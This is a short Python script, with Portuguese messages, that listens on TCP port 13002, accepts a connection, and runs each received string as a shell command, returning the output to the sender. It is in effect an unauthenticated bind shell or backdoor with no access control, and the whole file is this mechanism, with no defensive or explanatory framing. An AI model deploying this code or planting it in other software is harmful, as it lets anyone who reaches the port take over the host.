#coding:utf-8
from socket import *
import subprocess

serverPort = 13002

serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind(('',serverPort))
serverSocket.listen(1)

connection_socket, addr = serverSocket.accept() 

print('O servidor Está Conectado!')

while (True):
	recebeComando = connection_socket.recv(1024).decode('utf-8')
	saida = subprocess.getstatusoutput(recebeComando)
	
	connection_socket.send(str(saida[1]).encode())

connection_socket.close()
